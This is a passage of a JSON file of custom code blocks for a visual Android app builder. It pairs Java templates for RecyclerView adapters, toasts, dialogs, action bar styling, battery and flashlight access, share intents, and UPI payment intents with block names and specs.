Duration%d"},{"code":"%1$s.setAdapter(%2$s);","name":"RecyclerViewSetAdapter","palette":"-1","type":" ","spec":"%m.RecyclerView setAdapterName %s.inputOnly"},{"code":"%1$s.setLayoutManager(new LinearLayoutManager(%2$s.this));","name":"RecyclerviewLayoutManager","palette":"-1","type":" ","spec":"%m.RecyclerView LayoutManager at %m.activity"},{"code":"public class %1$s extends RecyclerView.Adapter\u003cRecyclerView.%2$s\u003e {\n    %3$s\n}","name":"ClassAdapterRecyclerView","palette":"-1","type":"c","spec":"ClassRecyclerViewAdapter %s.inputOnly viewHolderName %s.inputOnly"},{"code":"private Context context;","name":"PrivateContext","palette":"-1","type":" ","spec":"PrivateContext"},{"code":"private List\u003c%1$s\u003e %2$s;","name":"PrivateArrayList","palette":"-1","type":" ","spec":"ArrayList fromClassList %s.inputOnly namaList %s.inputOnly"},{"code":"    public %1$s(Context context, List\u003c%2$s\u003e %3$s) {\n        this.%3$s \u003d %3$s;\n        this.context \u003d context;\n        %4$s\n    }","name":"AdapterSetData","palette":"-1","type":"c","spec":"Adapter %s.inputOnly ClassList %s.inputOnly listName %s.inputOnly"},{"code":"    //ViewHolder Digunakan Untuk Menyimpan Referensi Dari View-View\n    public class %1$s extends RecyclerView.ViewHolder{\n\n        %2$s\n    }","name":"ClassViewHolder","palette":"-1","type":"c","spec":"ClassViewHolder %s.inputOnly extendRecyclerViewHolder"},{"code":"private TextView %1$s;","name":"PrivateTextViewWidget","palette":"-1","type":" ","spec":"PrivateTextView %s.inputOnly"},{"code":"private LinearLayout %1$s;","name":"PrivateLinearLayoutWidget","palette":"-1","type":" ","spec":"PrivateLinearLayout %s.inputOnly"},{"code":"private ImageView %1$s;","name":"PrivateImageViewWidget","palette":"-1","type":" ","spec":"PrivateImageView %s.inputOnly"},{"code":"        %1$s(View %2$s) {\n            super(%2$s);\n            %3$s\n        }","name":"ViewHolderItem","palette":"-1","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly"},{"code":"        %1$s \u003d %2$s.findViewById(R.id.%1$s);","name":"findViewWidget","palette":"-1","type":" ","spec":"findView %s.inputOnly atView %s.inputOnly"},{"code":"    @Override\n    public %1$s onCreateViewHolder(ViewGroup parent, int viewType) {\n        //Membuat View untuk Menyiapkan dan Memasang Layout yang Akan digunakan pada RecyclerView\n        View %2$s \u003d LayoutInflater.from(parent.getContext()).inflate(R.layout.%3$s, parent, false);\n        return new %1$s(%2$s);\n    }","name":"onCreateViewHolder","palette":"-1","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly inflateLayout %s.inputOnly"},{"code":"    @Override\n    public void onBindViewHolder(%1$s %2$s, int position) {\n        %3$s\n    }","name":"onBindView","palette":"-1","type":"c","spec":"onBindViewHolder ViewHolder %s.inputOnly nameViewHolder %s.inputOnly"},{"code":"position","name":"position","palette":"-1","type":"d","spec":"position"},{"code":"%1$s.get%2$s()","name":"StringGetData","palette":"-1","type":"s","spec":"ListName %s.inputOnly getKey %s.inputOnly"},{"code":"final String %1$s \u003d %2$s;","name":"finalString","palette":"-1","type":" ","spec":"FinalStringName %s.inputOnly dataString %s"},{"code":"%1$s","name":"getString","typeName":"String","palette":"-1","type":"v","spec":"StringName %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetText","typeName":"TextView","palette":"-1","type":"v","spec":"holderName %s.inputOnly TextView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetImage","typeName":"ImageView","palette":"-1","type":"v","spec":"holderName %s.inputOnly ImageView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderLinearLayout","typeName":"LinearLayout","palette":"-1","type":"v","spec":"holderName %s.inputOnly LinearLayout_ID %s.inputOnly"},{"code":"        %1$s.setOnLongClickListener(new View.OnLongClickListener() {\n            @Override\n            public boolean onLongClick(View v) {\n                \n                %2$s\n                return true;\n            }\n        });","name":"onLongClickItem","palette":"-1","type":"c","spec":"onLongClickItem %m.View"},{"code":"    @Override\n    public int getItemCount() {\n        //Menghitung Ukuran/Jumlah Data Yang Akan Ditampilkan Pada RecyclerView\n        %1$s\n    }","name":"getItemCountRecyclerview","palette":"-1","type":"c","spec":"getItemCount Recyclerview"},{"code":"        return %1$s.size();","name":"MaxSizeListData","palette":"-1","type":" ","spec":"MaxSizeList %s.inputOnly"},{"code":"        return %1$s;","name":"CountListData","palette":"-1","type":" ","spec":"CountList %d"},{"code":"public class %1$s {\n\n    %2$s\n}","name":"ClassModel","palette":"-1","type":"c","spec":"RecyclerView ClassModel %s.inputOnly"},{"code":"    private String %1$s;","name":"privateStringModel","palette":"-1","type":" ","spec":"StringName %s.inputOnly"},{"code":"    public String get%1$s() {\n        return %2$s;\n    }\n\n    public void set%1$s(String %2$s) {\n        this.%2$s \u003d %2$s;\n    }","name":"publicVoidString","palette":"-1","type":" ","spec":"public String %s.inputOnly return %s.inputOnly"},{"code":"    public %1$s(){\n    }\n\n    //Konstruktor dengan beberapa parameter, untuk mendapatkan Input Data dari User\n    public %1$s(%2$s) {\n        %3$s\n    }","name":"getDataFirebase","palette":"-1","type":"c","spec":"ClassModelName %s.inputOnly allString %s.inputOnly"},{"code":"        this.%1$s \u003d %1$s;","name":"indexStringNameDateFB","palette":"-1","type":" ","spec":"IndexStringName %s.inputOnly"},{"code":"private CardView %1$s;","name":"PrivateCardView","palette":"-1","type":" ","spec":"PrivateCardView %s.inputOnly"},{"code":"%1$s.setAdapter(new %1$SAdapter(%2$s));","name":"RecyclerViewAdapter","palette":"-1","type":" ","spec":"RecyclerView %m.RecyclerView data %m.list"},{"code":"%1$s \u003d new RecyclerView(%2$s.this);\n%1$s.setLayoutParams(new ViewGroup.LayoutParams( ViewGroup.LayoutParams.%3$S, ViewGroup.LayoutParams.%4$S));","name":"CreateRecyclerview","palette":"72","type":" ","spec":"%m.RecyclerView at %m.activity Width %s.inputOnly Height %s.inputOnly"},{"code":"%1$s","name":"RecyclerView","typeName":"RecyclerView","palette":"72","type":"v","spec":"%s.inputOnly RecyclerView"},{"code":"%1$s %2$s \u003d new %1$s(%4$s, %3$s.this);","name":"AdapterRecyclerView","palette":"72","type":" ","spec":"Adapter %s.inputOnly name %s.inputOnly at %m.activity dataList %m.list"},{"code":"%1$s.setAdapter(%2$s);","name":"RecyclerViewSetAdapter","palette":"72","type":" ","spec":"%m.RecyclerView setAdapterName %s.inputOnly"},{"code":"%1$s","name":"ListCustome","typeName":"List","palette":"72","type":"v","spec":"%s.inputOnly List"},{"code":"%1$s.setLayoutManager(new LinearLayoutManager(%2$s.this));","name":"RecyclerviewLayoutManager","palette":"72","type":" ","spec":"%m.RecyclerView LayoutManager at %m.activity"},{"code":"public class %1$s extends RecyclerView.Adapter\u003cRecyclerView.%2$s\u003e {\n    %3$s\n}","name":"ClassAdapterRecyclerView","palette":"72","type":"c","spec":"ClassRecyclerViewAdapter %s.inputOnly viewHolderName %s.inputOnly"},{"code":"private Context context;","name":"PrivateContext","palette":"72","type":" ","spec":"PrivateContext"},{"code":"private List\u003c%1$s\u003e %2$s;","name":"PrivateArrayList","palette":"72","type":" ","spec":"ArrayList fromClassList %s.inputOnly namaList %s.inputOnly"},{"code":"    public %1$s(Context context, List\u003c%2$s\u003e %3$s) {\n        this.%3$s \u003d %3$s;\n        this.context \u003d context;\n        %4$s\n    }","name":"AdapterSetData","palette":"72","type":"c","spec":"Adapter %s.inputOnly ClassList %s.inputOnly listName %s.inputOnly"},{"code":"    //ViewHolder Digunakan Untuk Menyimpan Referensi Dari View-View\n    public class %1$s extends RecyclerView.ViewHolder{\n\n        %2$s\n    }","name":"ClassViewHolder","palette":"72","type":"c","spec":"ClassViewHolder %s.inputOnly extendRecyclerViewHolder"},{"code":"private TextView %1$s;","name":"PrivateTextViewWidget","palette":"72","type":" ","spec":"PrivateTextView %s.inputOnly"},{"code":"private LinearLayout %1$s;","name":"PrivateLinearLayoutWidget","palette":"72","type":" ","spec":"PrivateLinearLayout %s.inputOnly"},{"code":"private ImageView %1$s;","name":"PrivateImageViewWidget","palette":"72","type":" ","spec":"PrivateImageView %s.inputOnly"},{"code":"        %1$s(View %2$s) {\n            super(%2$s);\n            %3$s\n        }","name":"ViewHolderItem","palette":"72","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly"},{"code":"        %1$s \u003d %2$s.findViewById(R.id.%1$s);","name":"findViewWidget","palette":"72","type":" ","spec":"findView %s.inputOnly atView %s.inputOnly"},{"code":"    @Override\n    public %1$s onCreateViewHolder(ViewGroup parent, int viewType) {\n        //Membuat View untuk Menyiapkan dan Memasang Layout yang Akan digunakan pada RecyclerView\n        View %2$s \u003d LayoutInflater.from(parent.getContext()).inflate(R.layout.%3$s, parent, false);\n        return new %1$s(%2$s);\n    }","name":"onCreateViewHolder","palette":"72","type":"c","spec":"ViewHolder %s.inputOnly View %s.inputOnly inflateLayout %s.inputOnly"},{"code":"    @Override\n    public void onBindViewHolder(%1$s %2$s, int position) {\n        %3$s\n    }","name":"onBindView","palette":"72","type":"c","spec":"onBindViewHolder ViewHolder %s.inputOnly nameViewHolder %s.inputOnly"},{"code":"position","name":"position","palette":"72","type":"d","spec":"position"},{"code":"%1$s.get%2$s()","name":"StringGetData","palette":"72","type":"s","spec":"ListName %s.inputOnly getKey %s.inputOnly"},{"code":"final String %1$s \u003d %2$s;","name":"finalString","palette":"72","type":" ","spec":"FinalStringName %s.inputOnly dataString %s"},{"code":"%1$s","name":"getString","typeName":"String","palette":"72","type":"v","spec":"StringName %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetText","typeName":"TextView","palette":"72","type":"v","spec":"holderName %s.inputOnly TextView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderWidgetImage","typeName":"ImageView","palette":"72","type":"v","spec":"holderName %s.inputOnly ImageView_ID %s.inputOnly"},{"code":"%1$s.%2$s","name":"holderLinearLayout","typeName":"LinearLayout","palette":"72","type":"v","spec":"holderName %s.inputOnly LinearLayout_ID %s.inputOnly"},{"code":"        %1$s.setOnLongClickListener(new View.OnLongClickListener() {\n            @Override\n            public boolean onLongClick(View v) {\n                \n                %2$s\n                return true;\n            }\n        });","name":"onLongClickItem","palette":"72","type":"c","spec":"onLongClickItem %m.View"},{"code":"    @Override\n    public int getItemCount() {\n        //Menghitung Ukuran/Jumlah Data Yang Akan Ditampilkan Pada RecyclerView\n        %1$s\n    }","name":"getItemCountRecyclerview","palette":"72","type":"c","spec":"getItemCount Recyclerview"},{"code":"        return %1$s.size();","name":"MaxSizeListData","palette":"72","type":" ","spec":"MaxSizeList %s.inputOnly"},{"code":"        return %1$s;","name":"CountListData","palette":"72","type":" ","spec":"CountList %d"},{"code":"public class %1$s {\n\n    %2$s\n}","name":"ClassModel","palette":"72","type":"c","spec":"RecyclerView ClassModel %s.inputOnly"},{"code":"    private String %1$s;","name":"privateStringModel","palette":"72","type":" ","spec":"StringName %s.inputOnly"},{"code":"    public String get%1$s() {\n        return %2$s;\n    }\n\n    public void set%1$s(String %2$s) {\n        this.%2$s \u003d %2$s;\n    }","name":"publicVoidString","palette":"72","type":" ","spec":"public String %s.inputOnly return %s.inputOnly"},{"code":"    public %1$s(){\n    }\n\n    //Konstruktor dengan beberapa parameter, untuk mendapatkan Input Data dari User\n    public %1$s(%2$s) {\n        %3$s\n    }","name":"getDataFirebase","palette":"72","type":"c","spec":"ClassModelName %s.inputOnly allString %s.inputOnly"},{"code":"        this.%1$s \u003d %1$s;","name":"indexStringNameDateFB","palette":"72","type":" ","spec":"IndexStringName %s.inputOnly"},{"code":"private CardView %1$s;","name":"PrivateCardView","palette":"72","type":" ","spec":"PrivateCardView %s.inputOnly"},{"code":"%1$s.setAdapter(new %1$SAdapter(%2$s));","name":"RecyclerViewAdapter","palette":"72","type":" ","spec":"RecyclerView %m.RecyclerView data %m.list"},{"code":"getActionBar().setIcon(R.drawable.%s);","color":"#3460FF","name":"abcolor","typeName":"","palette":"-1","type":" ","spec":"ActionBar setIcon%m.resource"},{"code":"getActionBar().setElevation(%s);","color":"#3460FF","name":"ab1","typeName":"","palette":"-1","type":" ","spec":"ActioBar setElevtion %d"},{"code":"%s \u003d\u003d %b","color":"#00DF39","name":"boolean","typeName":"","palette":"-1","type":"b","spec":"%b \u003d %b"},{"code":"getActionBar().setSubtitle(%s);","color":"#3460FF","name":"actionbr","typeName":"","palette":"-1","type":" ","spec":"ActionBar SubTitle %s"},{"code":"%s.getButtonDrawable().setColorFilter(Color.parseColor(\"%s\".replace(\"0x\", \"#\")), PorterDuff.Mode.SRC_IN);\n","color":"#3460FF","name":"checkbox","typeName":"","palette":"-1","type":" ","spec":"%m.checkbox CheckBox Color %m.color"},{"code":"%s.setOnLongClickListener(new View.OnLongClickListener() {@Override public boolean onLongClick(View v){ %s return false;}});","color":"#3460FF","name":"button","typeName":"","palette":"-1","type":"c","spec":"%m.view onLongClicked"},{"code":"%s.setError(%s);","color":"#3460FF","name":"edittext","typeName":"","palette":"-1","type":" ","spec":"%m.edittext setError %s"},{"code":"%s.setTextSize((float)%s);","color":"#3460FF","name":"text","typeName":"","palette":"-1","type":" ","spec":"%m.textview setTextSize %d"},{"code":"%s.setStackFromBottom(%b);","color":"#3460FF","name":"list","typeName":"","palette":"-1","type":" ","spec":"%m.listview setStackFromBottom %b"},{"code":"android.text.util.Linkify.addLinks(%s, android.text.util.Linkify.ALL);","name":"linkk","palette":"73","type":" ","spec":"Linkify %m.textview create"},{"code":"\r\n%s.setLinkTextColor(Color.parseColor(\"%s\".replace(\"0x\", \"#\")));","name":"link1","palette":"73","type":" ","spec":"Linkify %m.textview setLinkColor %m.color"},{"code":"%s.setClickable(%b); ","name":"link","palette":"73","type":" ","spec":"Linkify %m.textview setCheckable %b"},{"code":"RatingBar %s \u003d new RatingBar(this); \n","color":"#FF1D0E","name":"rating","typeName":"","palette":"73","type":" ","spec":"Create Rating Bar ID %s.inputOnly"},{"code":"%s.addView(%s);","color":"#FF1D0E","name":"rt1","typeName":"","palette":"73","type":" ","spec":"RatingBar Addview%m.view RatingBar ID %s.inputOnly"},{"code":"%s.setOnRatingBarChangeListener(new RatingBar.OnRatingBarChangeListener(){\n\t\t\t@Override\n\t\t\tpublic void onRatingChanged(RatingBar _ratingBar, float value, boolean _fromUser){\n\t\t\t\t%s\n\t\t\t}\n\t\t});","color":"#FF1D0E","name":"rt2","typeName":"","palette":"73","type":"c","spec":"RatingBar ID%s.inputOnly onChanged  "},{"code":"String.valueOf(value)","color":"#FF1D0E","name":"value","typeName":"","palette":"73","type":"d","spec":"value"},{"code":"%1$s.setAction(Intent.ACTION_VIEW);","name":"setintent","palette":"74","type":" ","spec":"%m.intent Whatsapp Api Initialization"},{"code":"%1$s.setData(Uri.parse(\"whatsapp://send?text\u003d%2$s\u0026phone\u003d%3$s%4$s\"));","name":"send sms","palette":"74","type":" ","spec":"%m.intent You Text Message %s.inputOnly Country Code %s.inputOnly Recever Number%d"},{"code":"startActivity(%1$s);","name":"Start sending","palette":"74","type":" ","spec":"%m.intent Start Sending"},{"code":"Intent %1$s \u003d new Intent(); %1$s.setAction(Intent.ACTION_SEND); %1$s.putExtra(Intent.EXTRA_TEXT, \"%2$s\"); %1$s.setType(\"text/plain\"); %1$s.setPackage(\"com.facebook.orca\"); \ntry { startActivity(%1$s); } catch (android.content.ActivityNotFoundException ex) {  SketchwareUtil.showMessage(getApplicationContext(), \"Facebook Messenger Not Installed\"); }","color":"#5C4BFF","name":"facebook","typeName":"","palette":"74","type":" ","spec":"%m.intent send fb messanger from %m.view"},{"code":"%1$s intent \u003d new %1$s();","name":"UPI Payment","palette":"75","type":" ","spec":"%m.intent "},{"code":"upi://pay?pa\u003d%1$s\u0026pn\u003d%2$s\u0026tn\u003d%3$s\u0026am\u003d%4$s\u0026cu\u003d%5$s","name":"UPI payment intent","palette":"75","type":"s","spec":"Your UPI Id%s and application name%s Enter Payment Description%s amount%d country name%s"},{"code":"%1$s chooser \u003d %1$s.createChooser(intent, \"Only Bhim UPI\");","name":"Start Upi","palette":"75","type":" ","spec":"UPI Chooser%m.intent"},{"code":"if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.JELLY_BEAN)","name":"sdk","palette":"75","type":" ","spec":"UPI Int Sdk"},{"code":"{ startActivityForResult(chooser, 1, null); }","name":"up","palette":"75","type":" ","spec":"Start it"},{"code":"final int cx \u003d %1$s.getMeasuredWidth() / 2; final int cy \u003d %1$s.getMeasuredHeight() / 2;  final int finalRadius \u003d Math.max(%1$s.getWidth(), %1$s.getHeight()) / 2;\nfinal Animator anim \u003d  ViewAnimationUtils.createCircularReveal(%1$s, cx, cy, 0, finalRadius);  %1$s.setVisibility(View.VISIBLE);\nanim.start();","name":"Circuler Transection","palette":"76","type":" ","spec":"%m.view Convert this Linear As Circuler Translation When Revealed"},{"code":"LinearLayout viewgroup \u003d(LinearLayout) %1$s;\n\nandroid.transition.AutoTransition autoTransition \u003d new android.transition.AutoTransition(); autoTransition.setDuration((long)%2$s); android.transition.TransitionManager.beginDelayedTransition(viewgroup, autoTransition);","name":"translation Effect","palette":"76","type":" ","spec":"%m.view active Translation Effect for Duration%d"},{"code":"BatteryManager bm \u003d (BatteryManager)getSystemService(BATTERY_SERVICE);\nint batLevel \u003d bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);\n%s.setText(Integer.toString(batLevel));","color":"#8D9700","name":"Battery level","typeName":"","palette":"77","type":" ","spec":"🔋 Battery  level in %m.textview"},{"code":"//Copied From Universal SketchCode Premium(6.1).\n//onCreate\nIntentFilter iFilter \u003d new IntentFilter(Intent.ACTION_BATTERY_CHANGED);\ngetApplicationContext().registerReceiver(mBroadcastReceiver,iFilter);\n\n\n\nprivate BroadcastReceiver mBroadcastReceiver \u003d new BroadcastReceiver() {\n@Override\npublic void onReceive(Context context, Intent intent) {\nToast.makeText(getApplicationContext(), \"Received\", Toast.LENGTH_SHORT).show();\nint health \u003d intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);\nString healthString \u003d \"\";\n// Determine the battery health from return integer value\nif(health \u003d\u003d BatteryManager.BATTERY_HEALTH_COLD){\n   healthString \u003d \"COLD\";\n}else if (health \u003d\u003d BatteryManager.BATTERY_HEALTH_DEAD){\n   healthString \u003d \"DEAD\";\n}else if (health \u003d\u003d BatteryManager.BATTERY_HEALTH_GOOD){\n   healthString \u003d \"GOOD\";\n}else if (health \u003d\u003d BatteryManager.BATTERY_HEALTH_OVERHEAT){\n   healthString \u003d \"OVER HEAT\";\n}else if (health \u003d\u003d BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE){\n   healthString \u003d \"OVER VOLTAGE\";\n}else if(health \u003d\u003d BatteryManager.BATTERY_HEALTH_UNKNOWN){\n   healthString \u003d \"UNKNOWN\";\n}else if(health \u003d\u003d BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE){\n   healthString \u003d \"UNSPECIFIED FAILURE\";\n}\n%s.setText(healthString);\n}\n};","color":"#8D9700","name":"battery health","typeName":"","palette":"77","type":" ","spec":"%m.textview show 🔋 Battery health"},{"code":"%s.setTextIsSelectable(%s);","color":"#FF5722","name":"text select","typeName":"","palette":"77","type":" ","spec":"%m.textview set selectable %b"},{"code":"%s.setAllCaps(%s);","color":"#FF5722","name":"all caps","typeName":"","palette":"77","type":" ","spec":"first word cap in %m.textview is %b"},{"code":"android.text.util.Linkify.addLinks(%1$s, android.text.util.Linkify.ALL);\n%1$s.setLinkTextColor(Color.parseColor(\"%2$s\"));\n%1$s.setLinksClickable(%3$s);","color":"#FF5722","name":"linkify","typeName":"","palette":"77","type":" ","spec":"linkify %m.textview link color %s.inputOnly link click %b "},{"code":"ClipboardManager clipboard \u003d (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); \n%s.setText(clipboard.getText());","color":"#FF5722","name":"clipboard edittext","typeName":"","palette":"77","type":" ","spec":"%m.textview get clipboard"},{"code":"%s.setTextSize((float)%s);","color":"#FF5722","name":"text size","typeName":"","palette":"77","type":" ","spec":"%m.textview size %d"},{"code":"%s.setText(Html.fromHtml(%s));","color":"#FF5722","name":"set html","typeName":"","palette":"77","type":" ","spec":"%m.textview set html %s"},{"code":"%s.setHint(%s);","color":"#FF5722","name":"hint","typeName":"","palette":"77","type":" ","spec":"%m.edittext set hint %s"},{"code":"%s.setError(%s);","color":"#FF5722","name":"error","typeName":"","palette":"77","type":" ","spec":"%m.edittext set error %s"},{"code":"%s.setCompoundDrawablesWithIntrinsicBounds(R.drawable.%s, 0, 0, 0);","color":"#FF5722","name":"edittext icon","typeName":"","palette":"77","type":" ","spec":"%m.edittext set icon %m.resource"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, true); } catch (android.hardware.camera2.CameraAccessException e) { }","color":"#000000","name":"flash on ","typeName":"","palette":"77","type":" ","spec":"flash on"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, false); } catch (android.hardware.camera2.CameraAccessException e) { }","color":"#000000","name":"flash off","typeName":"","palette":"77","type":" ","spec":"flash off"},{"code":"%1$s.setText(Build.VERSION.RELEASE);","color":"#FFC140","name":"version","typeName":"","palette":"77","type":" ","spec":"version %m.textview"},{"code":"%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","color":"#FFC140","name":"model","typeName":"","palette":"77","type":" ","spec":"Model %m.textview"},{"code":"%1$s.setText(Build.TAGS);","color":"#FFC140","name":"build tags","typeName":"","palette":"77","type":" ","spec":"build tags %m.textview"},{"code":"%1$s.setText(Build.VERSION.RELEASE);","color":"#FFC140","name":"version","typeName":"","palette":"77","type":" ","spec":"version %m.textview"},{"code":"getActionBar().setTitle(\"%1$s\");","color":"#2196F3","name":"title","typeName":"","palette":"78","type":" ","spec":"Action Bar title %s.inputOnly"},{"code":"getSupportActionBar().setTitle(\"%1$s\");","color":"#2196F3","name":"support title","typeName":"","palette":"78","type":" ","spec":"Action Bar Title  %s.inputOnly"},{"code":"getActionBar().setSubtitle(\"%1$s\");","color":"#2196F3","name":"subtitle","typeName":"","palette":"78","type":" ","spec":"Action Bar Subtitle  %s.inputOnly"},{"code":"getSupportActionBar().setSubtitle(\"%1$s\");","color":"#2196F3","name":"subtitle","typeName":"","palette":"78","type":" ","spec":"Action Bar Subtitle  %s.inputOnly"},{"code":"ActionBar actionBar \u003d getActionBar(); actionBar.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.parseColor(\"%1$s\")));\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.LOLLIPOP) {\n    Window w \u003d MainActivity.this.getWindow();\n    w.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n    w.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);","color":"#2196F3","name":"action Bar color","typeName":"","palette":"78","type":" ","spec":"Action Bar Color  %s.inputOnly"},{"code":"getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);","color":"#2196F3","name":"Full screen","typeName":"","palette":"78","type":" ","spec":"Action Bar Full-screen"},{"code":"getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);","color":"#2196F3","name":"Full screen","typeName":"","palette":"78","type":" ","spec":"Action Bar Un-Full-screen"},{"code":"getActionBar().setIcon(R.drawable.%1$s);","color":"#2196F3","name":"icon","typeName":"","palette":"78","type":" ","spec":"Action Bar Icon  %m.resource"},{"code":"Intent sendIntent \u003d new Intent();\n\nsendIntent.setAction(Intent.ACTION_SEND);\n\nsendIntent.putExtra(Intent.EXTRA_TEXT, %1$s);\n\nsendIntent.setType(\"text/plain\");\n\nIntent shareIntent \u003d Intent.createChooser(sendIntent,\"Share Using\");\n\n\nstartActivity(shareIntent);","color":"#AB47BC","name":"share text","typeName":"","palette":"79","type":" ","spec":"Share Text %s.inputOnly"},{"code":"Intent i \u003d getPackageManager().getLaunchIntentForPackage(\"%1$s\"); if (i \u003d\u003d null) { return; } i.addCategory(Intent.CATEGORY_LAUNCHER); startActivity(i);","color":"#AB47BC","name":"launch","typeName":"","palette":"79","type":" ","spec":"launch package: %s.inputOnly"},{"code":"%1$s.setTitle(\"Exit?\");\r\n%1$s.setMessage(\"Are You Sure To Exit?\");\r\n%1$s.setPositiveButton(\"Yes\", new DialogInterface.OnClickListener() {\n\t@Override\n\tpublic void onClick(DialogInterface _dialog, int _which) {\n\t\tfinishAffinity();\n\t}\n});\r\n%1$s.setNegativeButton(\"No\", new DialogInterface.OnClickListener() {\n\t@Override\n\tpublic void onClick(DialogInterface _dialog, int _which) {\n\t\t\n\t}\n});\r\n%1$s.create().show();","color":"#AB47BC","name":"exit dialog","typeName":"","palette":"79","type":" ","spec":"Exit App %m.dialog"},{"code":"%1$s.setTitle(\"%2$s\");\r\n%1$s.setMessage(\"%3$s\");\r\n%1$s.setPositiveButton(\"%4$s\", new DialogInterface.OnClickListener() {\n\t@Override\n\tpublic void onClick(DialogInterface _dialog, int _which) {\n\t\tfinishAffinity();\n\t}\n});\r\n%1$s.setNegativeButton(\"%5$s\", new DialogInterface.OnClickListener() {\n\t@Override\n\tpublic void onClick(DialogInterface _dialog, int _which) {\n\t\t\n\t}\n});\r\n%1$s.create().show();","color":"#AB47BC","name":"dialog","typeName":"","palette":"79","type":" ","spec":"%m.dialog Title %s.inputOnly Message %s.inputOnly Ok btn: %s.inputOnly No btn: "},{"code":"ViewGroup parentLayout \u003d (ViewGroup) ((ViewGroup) this .findViewById(android.R.id.content)).getChildAt(0);\n   com.google.android.material.snackbar.Snackbar.make(parentLayout, %1$s, com.google.android.material.snackbar.Snackbar.LENGTH_LONG).show();","color":"#FF6F00","name":"Snackbar","typeName":"","palette":"80","type":" ","spec":"SnackBar Message %s.inputOnly"},{"code":"Toast toast1 \u003d Toast.makeText(this, \"\".concat(%1$s), Toast.LENGTH_SHORT);\n\ntoast1.setGravity(Gravity.TOP,0,0);\n\ntoast1.show();","color":"#FF6F00","name":"top","typeName":"","palette":"80","type":" ","spec":"Top toast %s.inputOnly"},{"code":"Toast toast1 \u003d Toast.makeText(this, \"\".concat(%1$s), Toast.LENGTH_SHORT);\n\ntoast1.setGravity(Gravity.CENTER,0,0);\n\ntoast1.show();","color":"#FF6F00","name":"top center","typeName":"","palette":"80","type":" ","spec":"Center  toast %s.inputOnly"},{"code":"Toast toast1 \u003d Toast.makeText(this, \"\".concat(%1$s), Toast.LENGTH_SHORT);\n\ntoast1.setGravity(Gravity.BOTTOM,0,0);\n\ntoast1.show();","color":"#FF6F00","name":"bottom","typeName":"","palette":"80","type":" ","spec":"Bottom toast %s.inputOnly"},{"code":"Toast toast1 \u003d Toast.makeText(this, \"\".concat(%1$s), Toast.LENGTH_SHORT);\n\ntoast1.setGravity(Gravity.LEFT,0,0);\n\ntoast1.show();","color":"#FF6F00","name":"toast left","typeName":"","palette":"80","type":" ","spec":"Left toast %s.inputOnly"},{"code":"Toast toast1 \u003d Toast.makeText(this, \"\".concat(%1$s), Toast.LENGTH_SHORT);\n\ntoast1.setGravity(Gravity.BOTTOM | Gravity.RIGHT,0,0);\n\ntoast1.show();","color":"#FF6F00","name":"bottom right","typeName":"","palette":"80","type":" ","spec":"Bottom Right toast %s.inputOnly"},{"code":"%1$s.getProgressDrawable().setColorFilter(Color.parseColor(\"%2$s\"),","color":"#00838F","name":"progress bar color","typeName":"","palette":"81","type":" ","spec":"%m.progressbar color %m.color"},{"code":"%1$s.getProgressDrawable().setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"seekbar progress","typeName":"","palette":"81","type":" ","spec":"%m.seekbar Set progress %m.color"},{"code":"%1$s.getThumb().setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"seekbar bt","typeName":"","palette":"81","type":" ","spec":"%m.seekbar Set  Dot %m.color"},{"code":"%1$s.getThumb().setColorFilter(Color.parseColor(\"#00FF00FF\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"seekbar dot hide","typeName":"","palette":"81","type":" ","spec":"%m.seekbar Set Dot Gone "},{"code":"%1$s.setProgressDrawable(getResources().getDrawable(R.drawable.%2$s));","color":"#00838F","name":"seek progress","typeName":"","palette":"81","type":" ","spec":"%m.seekbar Set Progress %m.resource"},{"code":"%1$s.setThumb(getResources().getDrawable(R.drawable.%2$s));","color":"#00838F","name":"seek ","typeName":"","palette":"81","type":" ","spec":"%m.seekbar Set Dot icon %m.resource"},{"code":"%1$s.getButtonDrawable().setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"checkbox color","typeName":"","palette":"81","type":" ","spec":"%m.checkbox Color %m.color"},{"code":"%1$s.getTrackDrawable().setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"switch off color","typeName":"","palette":"81","type":" ","spec":"%m.switch  off color %m.color"},{"code":"%1$s.getThumbDrawable().setColorFilter(Color.parseColor(\"%2$s\"), PorterDuff.Mode.SRC_IN);","color":"#00838F","name":"switch ","typeName":"","palette":"81","type":" ","spec":"%m.switch set on color %m.color"},{"code":"%1$s.setTrackResource(R.drawable.%2$s);","color":"#00838F","name":"switch","typeName":"","palette":"81","type":" ","spec":"%m.switch set off 